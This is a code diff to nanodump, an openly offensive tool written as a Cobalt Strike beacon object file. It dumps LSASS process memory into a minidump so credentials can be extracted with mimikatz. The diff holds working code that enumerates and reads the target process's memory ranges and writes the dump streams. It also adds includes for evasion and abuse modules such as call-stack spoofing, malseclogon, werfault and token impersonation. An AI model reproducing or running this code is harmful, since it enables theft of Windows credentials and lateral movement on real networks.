@@ -1,32 +1,37 @@
 #include "nanodump.h"
 #include "beacon.h"
+#ifdef BOF
+#include "output.h"
 #include "utils.c"
 #include "handle.c"
 #include "modules.c"
 #include "syscalls.c"
-#include "debugpriv.c"
+#include "token_priv.c"
 #include "malseclogon.c"
+#include "werfault.c"
+#include "spoof_callstack.c"
+#include "shtinkering.c"
+#include "impersonate.c"
+#include "hw_breakpoint.c"
+#endif
 
-void writeat(
-    Pdump_context dc,
-    ULONG32 rva,
-    const PVOID data,
-    unsigned size
-)
+VOID writeat(
+    IN Pdump_context dc,
+    IN ULONG32 rva,
+    IN const PVOID data,
+    IN unsigned size)
 {
     PVOID dst = RVA(
         PVOID,
         dc->BaseAddress,
-        rva
-    );
+        rva);
     memcpy(dst, data, size);
 }
 
 BOOL append(
-    Pdump_context dc,
-    const PVOID data,
-    unsigned size
-)
+    IN Pdump_context dc,
+    IN const PVOID data,
+    IN ULONG32 size)
 {
     ULONG32 new_rva = dc->rva + size;
     if (new_rva < dc->rva)
@@ -48,11 +53,10 @@ BOOL append(
 }
 
 BOOL write_header(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing header");
-    MiniDumpHeader header;
+    MiniDumpHeader header = { 0 };
     DPRINT("Signature: 0x%x", dc->Signature);
     header.Signature = dc->Signature;
     DPRINT("Version: %hu", dc->Version);
@@ -66,16 +70,19 @@ BOOL write_header(
     header.TimeDateStamp = 0;
     header.Flags = MiniDumpNormal;
 
-    char header_bytes[SIZE_OF_HEADER];
-    memcpy(header_bytes + offsetof(MiniDumpHeader, Signature), &header.Signature, sizeof(header.Signature));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, Version), &header.Version, sizeof(header.Version));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, ImplementationVersion), &header.ImplementationVersion, sizeof(header.ImplementationVersion));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, NumberOfStreams), &header.NumberOfStreams, sizeof(header.NumberOfStreams));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, StreamDirectoryRva), &header.StreamDirectoryRva, sizeof(header.StreamDirectoryRva));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, CheckSum), &header.CheckSum, sizeof(header.CheckSum));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, Reserved), &header.Reserved, sizeof(header.Reserved));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, TimeDateStamp), &header.TimeDateStamp, sizeof(header.TimeDateStamp));
-    memcpy(header_bytes + offsetof(MiniDumpHeader, Flags), &header.Flags, sizeof(header.Flags));
+    char header_bytes[SIZE_OF_HEADER] = { 0 };
+
+    DWORD offset = 0;
+    memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
+    memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
+    memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
+    memcpy(header_bytes + offset, &header.Flags, 4);
+
     if (!append(dc, header_bytes, SIZE_OF_HEADER))
     {
         DPRINT_ERR("Failed to write header");
@@ -86,14 +93,14 @@ BOOL write_header(
 }
 
 BOOL write_directory(
-    Pdump_context dc,
-    MiniDumpDirectory directory
-)
+    IN Pdump_context dc,
+    IN MiniDumpDirectory directory)
 {
-    BYTE directory_bytes[SIZE_OF_DIRECTORY];
-    memcpy(directory_bytes + offsetof(MiniDumpDirectory, StreamType), &directory.StreamType, sizeof(directory.StreamType));
-    memcpy(directory_bytes + offsetof(MiniDumpDirectory, DataSize), &directory.DataSize, sizeof(directory.DataSize));
-    memcpy(directory_bytes + offsetof(MiniDumpDirectory, Rva), &directory.Rva, sizeof(directory.Rva));
+    BYTE directory_bytes[SIZE_OF_DIRECTORY] = { 0 };
+    DWORD offset = 0;
+    memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
+    memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
+    memcpy(directory_bytes + offset, &directory.Rva, 4);
     if (!append(dc, directory_bytes, sizeof(directory_bytes)))
         return FALSE;
 
@@ -101,11 +108,10 @@ BOOL write_directory(
 }
 
 BOOL write_directories(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing directory: SystemInfoStream");
-    MiniDumpDirectory system_info_directory;
+    MiniDumpDirectory system_info_directory = { 0 };
     system_info_directory.StreamType = SystemInfoStream;
     system_info_directory.DataSize = 0; // this is calculated and written later
     system_info_directory.Rva = 0; // this is calculated and written later
@@ -116,7 +122,7 @@ BOOL write_directories(
     }
 
     DPRINT("Writing directory: ModuleListStream");
-    MiniDumpDirectory module_list_directory;
+    MiniDumpDirectory module_list_directory = { 0 };
     module_list_directory.StreamType = ModuleListStream;
     module_list_directory.DataSize = 0; // this is calculated and written later
     module_list_directory.Rva = 0; // this is calculated and written later
@@ -127,7 +133,7 @@ BOOL write_directories(
     }
 
     DPRINT("Writing directory: Memory64ListStream");
-    MiniDumpDirectory memory64_list_directory;
+    MiniDumpDirectory memory64_list_directory = { 0 };
     memory64_list_directory.StreamType = Memory64ListStream;
     memory64_list_directory.DataSize = 0; // this is calculated and written later
     memory64_list_directory.Rva = 0; // this is calculated and written later
@@ -141,10 +147,9 @@ BOOL write_directories(
 }
 
 BOOL write_system_info_stream(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
-    MiniDumpSystemInfo system_info;
+    MiniDumpSystemInfo system_info = { 0 };
 
     DPRINT("Writing SystemInfoStream");
 
@@ -194,30 +199,31 @@ BOOL write_system_info_stream(
 #endif
 
     ULONG32 stream_size = SIZE_OF_SYSTEM_INFO_STREAM;
-    char system_info_bytes[SIZE_OF_SYSTEM_INFO_STREAM];
+    char system_info_bytes[SIZE_OF_SYSTEM_INFO_STREAM] = { 0 };
 
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProcessorArchitecture), &system_info.ProcessorArchitecture, sizeof(system_info.ProcessorArchitecture));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProcessorLevel), &system_info.ProcessorLevel, sizeof(system_info.ProcessorLevel));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProcessorRevision), &system_info.ProcessorRevision, sizeof(system_info.ProcessorRevision));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, NumberOfProcessors), &system_info.NumberOfProcessors, sizeof(system_info.NumberOfProcessors));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProductType), &system_info.ProductType, sizeof(system_info.ProductType));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, MajorVersion), &system_info.MajorVersion, sizeof(system_info.MajorVersion));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, MinorVersion), &system_info.MinorVersion, sizeof(system_info.MinorVersion));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, BuildNumber), &system_info.BuildNumber, sizeof(system_info.BuildNumber));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, PlatformId), &system_info.PlatformId, sizeof(system_info.PlatformId));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, CSDVersionRva), &system_info.CSDVersionRva, sizeof(system_info.CSDVersionRva));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, SuiteMask), &system_info.SuiteMask, sizeof(system_info.SuiteMask));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, Reserved2), &system_info.Reserved2, sizeof(system_info.Reserved2));
+    DWORD offset = 0;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
+    memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
+    memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
+    memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
 #if _WIN64
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProcessorFeatures1), &system_info.ProcessorFeatures1, sizeof(system_info.ProcessorFeatures1));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, ProcessorFeatures2), &system_info.ProcessorFeatures2, sizeof(system_info.ProcessorFeatures2));
+    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
+    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8);
 #else
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, VendorId1), &system_info.VendorId1, sizeof(system_info.VendorId1));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, VendorId2), &system_info.VendorId2, sizeof(system_info.VendorId2));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, VendorId3), &system_info.VendorId3, sizeof(system_info.VendorId3));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, VersionInformation), &system_info.VersionInformation, sizeof(system_info.VersionInformation));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, FeatureInformation), &system_info.FeatureInformation, sizeof(system_info.FeatureInformation));
-    memcpy(system_info_bytes + offsetof(MiniDumpSystemInfo, AMDExtendedCpuFeatures), &system_info.AMDExtendedCpuFeatures, sizeof(system_info.AMDExtendedCpuFeatures));
+    memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
+    memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4);
 #endif
 
     ULONG32 stream_rva = dc->rva;
@@ -255,8 +261,7 @@ BOOL write_system_info_stream(
 }
 
 Pmodule_info write_module_list_stream(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing the ModuleListStream");
 
@@ -271,8 +276,7 @@ Pmodule_info write_module_list_stream(
         dc->hProcess,
         important_modules,
         ARRAY_SIZE(important_modules),
-        TRUE
-    );
+        TRUE);
     if (!module_list)
     {
         DPRINT_ERR("Failed to write the ModuleListStream");
@@ -286,21 +290,21 @@ Pmodule_info write_module_list_stream(
     {
         number_of_modules++;
         curr_module->name_rva = dc->rva;
-        ULONG32 full_name_length = wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
+        ULONG32 full_name_length = (ULONG32)wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
         full_name_length++; // account for the null byte at the end
         full_name_length *= 2;
         // write the length of the name
         if (!append(dc, &full_name_length, 4))
         {
             DPRINT_ERR("Failed to write the ModuleListStream");
-            free_linked_list(module_list); module_list = NULL;
+            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
         // write the path
         if (!append(dc, curr_module->dll_name, full_name_length))
         {
             DPRINT_ERR("Failed to write the ModuleListStream");
-            free_linked_list(module_list); module_list = NULL;
+            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
         curr_module = curr_module->next;
@@ -311,14 +315,14 @@ Pmodule_info write_module_list_stream(
     if (!append(dc, &number_of_modules, 4))
     {
         DPRINT_ERR("Failed to write the ModuleListStream");
-        free_linked_list(module_list); module_list = NULL;
+        free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
         return NULL;
     }
-    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE];
+    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE] = { 0 };
     curr_module = module_list;
     while (curr_module)
     {
-        MiniDumpModule module;
+        MiniDumpModule module = { 0 };
         module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
         module.SizeOfImage = curr_module->size_of_image;
         module.CheckSum = curr_module->CheckSum;
@@ -342,37 +346,38 @@ Pmodule_info write_module_list_stream(
         module.MiscRecord.DataSize = 0;
         module.MiscRecord.rva = 0;
         module.Reserved0 = 0;
-        module.Reserved0 = 0;
+        module.Reserved1 = 0;
 
-        memcpy(module_bytes + offsetof(MiniDumpModule, BaseOfImage), &module.BaseOfImage, sizeof(module.BaseOfImage));
-        memcpy(module_bytes + offsetof(MiniDumpModule, SizeOfImage), &module.SizeOfImage, sizeof(module.SizeOfImage));
-        memcpy(module_bytes + offsetof(MiniDumpModule, CheckSum), &module.CheckSum, sizeof(module.CheckSum));
-        memcpy(module_bytes + offsetof(MiniDumpModule, TimeDateStamp), &module.TimeDateStamp, sizeof(module.TimeDateStamp));
-        memcpy(module_bytes + offsetof(MiniDumpModule, ModuleNameRva), &module.ModuleNameRva, sizeof(module.ModuleNameRva));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwSignature, sizeof(module.VersionInfo.dwSignature));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwStrucVersion, sizeof(module.VersionInfo.dwStrucVersion));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileVersionMS, sizeof(module.VersionInfo.dwFileVersionMS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileVersionLS, sizeof(module.VersionInfo.dwFileVersionLS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwProductVersionMS, sizeof(module.VersionInfo.dwProductVersionMS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwProductVersionLS, sizeof(module.VersionInfo.dwProductVersionLS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileFlagsMask, sizeof(module.VersionInfo.dwFileFlagsMask));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileFlags, sizeof(module.VersionInfo.dwFileFlags));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileOS, sizeof(module.VersionInfo.dwFileOS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileType, sizeof(module.VersionInfo.dwFileType));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileSubtype, sizeof(module.VersionInfo.dwFileSubtype));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileDateMS, sizeof(module.VersionInfo.dwFileDateMS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, VersionInfo), &module.VersionInfo.dwFileDateLS, sizeof(module.VersionInfo.dwFileDateLS));
-        memcpy(module_bytes + offsetof(MiniDumpModule, CvRecord), &module.CvRecord.DataSize, sizeof(module.CvRecord.DataSize));
-        memcpy(module_bytes + offsetof(MiniDumpModule, CvRecord), &module.CvRecord.rva, sizeof(module.CvRecord.rva));
-        memcpy(module_bytes + offsetof(MiniDumpModule, MiscRecord), &module.MiscRecord.DataSize, sizeof(module.MiscRecord.DataSize));
-        memcpy(module_bytes + offsetof(MiniDumpModule, MiscRecord), &module.MiscRecord.rva, sizeof(module.MiscRecord.rva));
-        memcpy(module_bytes + offsetof(MiniDumpModule, Reserved0), &module.Reserved0, sizeof(module.Reserved0));
-        memcpy(module_bytes + offsetof(MiniDumpModule, Reserved1), &module.Reserved1, sizeof(module.Reserved1));
+        DWORD offset = 0;
+        memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
+        memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
+        memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
+        memcpy(module_bytes + offset, &module.Reserved1, 8);
 
         if (!append(dc, module_bytes, sizeof(module_bytes)))
         {
             DPRINT_ERR("Failed to write the ModuleListStream");
-            free_linked_list(module_list); module_list = NULL;
+            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
         curr_module = curr_module->next;
@@ -389,9 +394,8 @@ Pmodule_info write_module_list_stream(
 }
 
 BOOL is_important_module(
-    PVOID address,
-    Pmodule_info module_list
-)
+    IN PVOID address,
+    IN Pmodule_info module_list)
 {
     Pmodule_info curr_module = module_list;
     while (curr_module)
@@ -405,9 +409,8 @@ BOOL is_important_module(
 }
 
 PMiniDumpMemoryDescriptor64 get_memory_ranges(
-    Pdump_context dc,
-    Pmodule_info module_list
-)
+    IN Pdump_context dc,
+    IN Pmodule_info module_list)
 {
     PMiniDumpMemoryDescriptor64 ranges_list = NULL;
     PVOID base_address, current_address;
@@ -415,40 +418,47 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     ULONG64 region_size;
     current_address = 0;
     MEMORY_INFORMATION_CLASS mic = 0;
-    MEMORY_BASIC_INFORMATION mbi;
-    DWORD number_of_ranges;
+    MEMORY_BASIC_INFORMATION mbi = {0};
+    DWORD number_of_ranges = 0;
+    NTSTATUS status;
 
     DPRINT("Getting memory ranges to dump");
 
     while (TRUE)
     {
-        NTSTATUS status = NtQueryVirtualMemory(
+        status = NtQueryVirtualMemory(
             dc->hProcess,
             (PVOID)current_address,
             mic,
             &mbi,
             sizeof(mbi),
-            NULL
-        );
+            NULL);
         if (!NT_SUCCESS(status))
             break;
 
         base_address = mbi.BaseAddress;
         region_size = mbi.RegionSize;
+
+        if (((ULONG_PTR)base_address + region_size) < (ULONG_PTR)base_address)
+            break;
+
         // next memory range
-        current_address = base_address + region_size;
+        current_address = RVA(PVOID, base_address, region_size);
 
         // ignore non-commited pages
         if (mbi.State != MEM_COMMIT)
             continue;
+        // ignore mapped pages
+        if (mbi.Type  == MEM_MAPPED)
+            continue;
         // ignore pages with PAGE_NOACCESS
         if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
             continue;
-        // ignore mapped pages
-        if (mbi.Type == MEM_MAPPED)
+        // ignore pages with PAGE_GUARD
+        if ((mbi.Protect & PAGE_GUARD)    == PAGE_GUARD)
             continue;
-        // ignore pages with PAGE_GUARD as they can't be read
-        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
+        // ignore pages with PAGE_EXECUTE
+        if ((mbi.Protect & PAGE_EXECUTE)  == PAGE_EXECUTE)
             continue;
         // ignore modules that are not relevant to mimikatz
         if (mbi.Type == MEM_IMAGE &&
@@ -456,6 +466,11 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 base_address,
                 module_list))
             continue;
+#ifdef SSP
+        // if nanodump is running in LSASS, don't dump the dump :)
+        if (dc->BaseAddress == base_address)
+            continue;
+#endif
 
         new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
@@ -484,17 +499,21 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         }
         number_of_ranges++;
     }
+    if (!ranges_list)
+    {
+        syscall_failed("NtQueryVirtualMemory", status);
+        DPRINT_ERR("Failed to enumerate memory ranges");
+        return NULL;
+    }
     DPRINT(
         "Enumearted %ld ranges of memory",
-        number_of_ranges
-    );
+        number_of_ranges);
     return ranges_list;
 }
 
 PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
-    Pdump_context dc,
-    Pmodule_info module_list
-)
+    IN Pdump_context dc,
+    IN Pmodule_info module_list)
 {
     PMiniDumpMemoryDescriptor64 memory_ranges;
     ULONG32 stream_rva = dc->rva;
@@ -503,8 +522,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 
     memory_ranges = get_memory_ranges(
         dc,
-        module_list
-    );
+        module_list);
     if (!memory_ranges)
     {
         DPRINT_ERR("Failed to write the Memory64ListStream");
@@ -522,17 +540,24 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     if (!append(dc, &number_of_ranges, 8))
     {
         DPRINT_ERR("Failed to write the Memory64ListStream");
-        free_linked_list(memory_ranges); memory_ranges = NULL;
+        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
+        return NULL;
+    }
+    // make sure we don't overflow stream_size
+    if (16 + 16 * number_of_ranges > 0xffffffff)
+    {
+        DPRINT_ERR("Too many ranges!");
+        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
         return NULL;
     }
 
     // write the rva of the actual memory content
-    ULONG32 stream_size = 16 + 16 * number_of_ranges;
-    ULONG64 base_rva = stream_rva + stream_size;
+    ULONG32 stream_size = (ULONG32)(16 + 16 * number_of_ranges);
+    ULONG64 base_rva = (ULONG64)stream_rva + stream_size;
     if (!append(dc, &base_rva, 8))
     {
         DPRINT_ERR("Failed to write the Memory64ListStream");
-        free_linked_list(memory_ranges); memory_ranges = NULL;
+        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
         return NULL;
     }
 
@@ -543,13 +568,13 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         if (!append(dc, &curr_range->StartOfMemoryRange, 8))
         {
             DPRINT_ERR("Failed to write the Memory64ListStream");
-            free_linked_list(memory_ranges); memory_ranges = NULL;
+            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
             return NULL;
         }
         if (!append(dc, &curr_range->DataSize, 8))
         {
             DPRINT_ERR("Failed to write the Memory64ListStream");
-            free_linked_list(memory_ranges); memory_ranges = NULL;
+            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
             return NULL;
         }
         curr_range = curr_range->next;
@@ -578,32 +603,33 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
             (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
             buffer,
             curr_range->DataSize,
-            NULL
-        );
+            NULL);
         // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
         if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
             DPRINT_ERR(
-                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...",
+                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%64llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...",
                 (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
                 curr_range->DataSize,
                 curr_range->State,
                 curr_range->Protect,
                 curr_range->Type,
-                status
-            );
+                status);
             //return NULL;
         }
-        if (!append(dc, buffer, curr_range->DataSize))
+        if (curr_range->DataSize > 0xffffffff)
+        {
+            DPRINT_ERR("The current range is larger that the 32-bit address space!");
+            curr_range->DataSize = 0xffffffff;
+        }
+        if (!append(dc, buffer, (ULONG32)curr_range->DataSize))
         {
             DPRINT_ERR("Failed to write the Memory64ListStream");
-            free_linked_list(memory_ranges); memory_ranges = NULL;
-            intFree(buffer); buffer = NULL;
+            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
+            DATA_FREE(buffer, curr_range->DataSize);
             return NULL;
         }
-        // overwrite it first, just in case
-        memset(buffer, 0, curr_range->DataSize);
-        intFree(buffer); buffer = NULL;
+        DATA_FREE(buffer, curr_range->DataSize);
         curr_range = curr_range->next;
     }
 
@@ -611,8 +637,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 }
 
 BOOL NanoDumpWriteDump(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing nanodump");
 
@@ -634,13 +659,15 @@ BOOL NanoDumpWriteDump(
     memory_ranges = write_memory64_list_stream(dc, module_list);
     if (!memory_ranges)
     {
-        free_linked_list(module_list); module_list = NULL;
+        free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
         return FALSE;
     }
 
-    free_linked_list(module_list); module_list = NULL;
+    free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
 
-    free_linked_list(memory_ranges); memory_ranges = NULL;
+    free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
+
+    DPRINT("The nanodump was created succesfully");
 
     return TRUE;
 }
